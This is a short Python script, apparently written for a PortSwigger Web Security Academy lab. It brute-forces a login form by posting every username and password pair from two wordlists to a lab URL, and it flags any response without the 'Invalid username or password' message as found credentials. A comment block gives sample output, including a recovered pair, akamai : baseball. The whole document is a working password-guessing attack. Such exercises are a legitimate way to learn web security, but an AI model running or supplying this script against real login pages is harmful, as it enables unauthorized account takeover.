
import requests


fd = open('usernames.txt','r')
wordlist = fd.read()
fd.close()

usernames = list(wordlist.split('\n'))
#print(usernames)

fd = open('passwords.txt','r')
wordlist = fd.read()
fd.close()

passwords = list(wordlist.split('\n'))
#print(passwords)


url = "https://ac2e1f6e1f004191c0d12ab300670073.web-security-academy.net/login"


#username=admin&password=admin

for i in usernames:
	for j in passwords:
		data2 = {
			"username":i,
			"password":j
		}

		r = requests.post(url,data=data2)
		if "Invalid username or password" not in r.text:
			print("Credentials found {} : {}".format(i,j))



'''
Credentials found aix : 
Credentials found ajax : 
Credentials found ak : 
Credentials found akamai : baseball
Credentials found akamai : 
'''
